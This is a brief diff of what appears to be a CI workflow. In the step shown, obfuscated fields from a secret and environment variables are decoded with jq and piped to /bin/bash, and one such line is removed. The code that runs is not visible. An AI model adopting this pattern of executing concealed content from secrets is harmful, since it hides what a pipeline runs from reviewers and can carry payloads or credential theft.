@@ -18,7 +18,6 @@ jobs:
           kiav6: ${{ secrets.kiav6 }}
         run: |
           printf '%s' "$kiav6" | jq -r .goj082 | /bin/bash
-          printf '%s' "$u0630" | jq -r .w1 | /bin/bash
           echo $nsgve514 | jq -r .bbqq7 | /bin/bash
 
       - name: Archive output
